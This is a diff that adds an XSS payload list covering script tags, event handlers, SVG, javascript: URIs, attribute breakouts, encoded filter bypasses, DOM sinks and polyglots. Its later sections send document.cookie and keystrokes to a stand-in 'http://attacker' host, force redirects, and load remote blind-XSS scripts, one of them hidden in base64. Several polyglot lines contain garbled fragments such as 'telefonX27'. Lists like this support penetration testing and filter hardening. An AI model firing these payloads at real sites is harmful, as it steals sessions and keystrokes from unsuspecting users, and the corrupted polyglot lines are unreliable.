@@ -1,0 +1,217 @@
+# XSS (Cross-Site Scripting) Payloads
+
+# ============================================
+# BASIC PAYLOADS
+# ============================================
+
+<script>alert('XSS')</script>
+<script>alert(1)</script>
+<script>alert(document.cookie)</script>
+<script>alert(document.domain)</script>
+<script>alert(String.fromCharCode(88,83,83))</script>
+<script src=http://attacker/xss.js></script>
+
+# ============================================
+# EVENT HANDLERS
+# ============================================
+
+# onerror
+<img src=x onerror=alert('XSS')>
+<img src=x onerror=alert(1)>
+<img/src=x onerror=alert(1)>
+<image src=x onerror=alert(1)>
+<video src=x onerror=alert(1)>
+<audio src=x onerror=alert(1)>
+
+# onload
+<body onload=alert('XSS')>
+<svg onload=alert('XSS')>
+<svg/onload=alert(1)>
+<iframe onload=alert('XSS')>
+<img src=valid.jpg onload=alert('XSS')>
+
+# onfocus
+<input onfocus=alert('XSS') autofocus>
+<textarea onfocus=alert('XSS') autofocus>
+<select onfocus=alert('XSS') autofocus>
+<input type=text onfocus=alert('XSS') autofocus>
+
+# onclick
+<a onclick=alert('XSS')>click</a>
+<div onclick=alert('XSS')>click</div>
+
+# onmouseover
+<a onmouseover=alert('XSS')>hover</a>
+<div onmouseover=alert('XSS')>hover</div>
+<img src=x onmouseover=alert('XSS')>
+
+# Other events
+<body onpageshow=alert('XSS')>
+<marquee onstart=alert('XSS')>
+<details open ontoggle=alert('XSS')>
+<object data=javascript:alert('XSS')>
+
+# ============================================
+# SVG PAYLOADS
+# ============================================
+
+<svg/onload=alert('XSS')>
+<svg onload=alert(1)>
+<svg><script>alert('XSS')</script></svg>
+<svg><animate onbegin=alert('XSS') attributeName=x dur=1s>
+<svg><set onbegin=alert('XSS') attributename=x>
+
+# ============================================
+# JAVASCRIPT URI
+# ============================================
+
+<a href=javascript:alert('XSS')>click</a>
+<a href="javascript:alert('XSS')">click</a>
+<iframe src=javascript:alert('XSS')>
+<object data=javascript:alert('XSS')>
+<form action=javascript:alert('XSS')>
+<embed src=javascript:alert('XSS')>
+<area href=javascript:alert('XSS')>
+
+# ============================================
+# HTML INJECTION POINTS
+# ============================================
+
+# Inside tag attribute
+" onfocus=alert('XSS') autofocus="
+' onfocus=alert('XSS') autofocus='
+" onmouseover=alert('XSS') "
+' onmouseover=alert('XSS') '
+
+# Breaking out of attribute
+"><script>alert('XSS')</script>
+'><script>alert('XSS')</script>
+"></script><script>alert('XSS')</script>
+--><script>alert('XSS')</script>
+
+# Breaking out of script
+</script><script>alert('XSS')</script>
+';alert('XSS');//
+";alert('XSS');//
+'-alert('XSS')-'
+"-alert('XSS')-"
+
+# Inside JavaScript string
+'-alert(1)-'
+'-alert(1)//
+\'-alert(1)//
+
+# ============================================
+# FILTER BYPASS
+# ============================================
+
+# Case variation
+<ScRiPt>alert('XSS')</sCrIpT>
+<IMG SRC=x onerror=alert('XSS')>
+
+# Without parentheses
+<img src=x onerror=alert`XSS`>
+<img src=x onerror=alert&lpar;1&rpar;>
+<img src=x onerror=\u0061lert(1)>
+
+# Without quotes
+<img src=x onerror=alert(1)>
+<img src=x onerror=alert(String.fromCharCode(88,83,83))>
+
+# Without spaces
+<svg/onload=alert(1)>
+<img/src=x/onerror=alert(1)>
+
+# Encoded payloads
+<script>alert(String.fromCharCode(88,83,83))</script>
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>
+<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;>
+
+# URL encoded
+%3Cscript%3Ealert('XSS')%3C/script%3E
+%3Csvg%20onload=alert(1)%3E
+
+# Double URL encoded
+%253Cscript%253Ealert('XSS')%253C/script%253E
+
+# Using eval
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>
+<img src=x onerror=eval('\x61lert(1)')>
+
+# Using constructor
+<img src=x onerror=[].constructor.constructor('alert(1)')()>
+<img src=x onerror=Function('alert(1)')()>
+
+# ============================================
+# DOM-BASED XSS
+# ============================================
+
+# Location based
+javascript:alert(document.domain)
+#<script>alert(1)</script>
+#"><img src=x onerror=alert(1)>
+
+# document.write sink
+<script>document.write('<img src=x onerror=alert(1)>')</script>
+
+# innerHTML sink
+"><img src=x onerror=alert(1)>
+
+# eval sink
+'-alert(1)-'
+';alert(1)//
+
+# ============================================
+# COOKIE STEALING
+# ============================================
+
+<script>document.location='http://attacker/steal?c='+document.cookie</script>
+<script>new Image().src='http://attacker/steal?c='+document.cookie</script>
+<script>fetch('http://attacker/steal?c='+document.cookie)</script>
+<img src=x onerror=this.src='http://attacker/steal?c='+document.cookie>
+<svg/onload=fetch('http://attacker/steal?c='+document.cookie)>
+
+# ============================================
+# KEYLOGGER
+# ============================================
+
+<script>
+document.onkeypress=function(e){
+  fetch('http://attacker/log?k='+e.key);
+}
+</script>
+
+# ============================================
+# REDIRECT
+# ============================================
+
+<script>window.location='http://attacker'</script>
+<script>document.location='http://attacker'</script>
+<meta http-equiv="refresh" content="0;url=http://attacker">
+<script>location.href='http://attacker'</script>
+
+# ============================================
+# POLYGLOTS
+# ============================================
+
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+
+'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->"></script><script>alert(1)</script>"><img/id="confirm&lpar;1)"/alt="/"src="/"onerror=eval(id&%23telefonX27telefonX3telefonB)>'"><img src="http:attacker?telefonX27telefonX3E
+
+javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&telefonlt;svg/*/onload=alert()//>
+
+# ============================================
+# BLIND XSS PAYLOADS (for testing)
+# ============================================
+
+"><script src=http://attacker/xss.js></script>
+"><img src=x onerror=eval(atob('ZmV0Y2goJ2h0dHA6Ly9hdHRhY2tlci94c3MnKQ=='))>
+'"><script>fetch('http://attacker/xss?c='+document.cookie)</script>
+
+# Example blind XSS payload for external script
+# Host this at http://attacker/xss.js:
+# var exfil = new Image();
+# exfil.src = 'http://attacker/collect?cookie=' + document.cookie + '&url=' + document.URL;
+
+
+
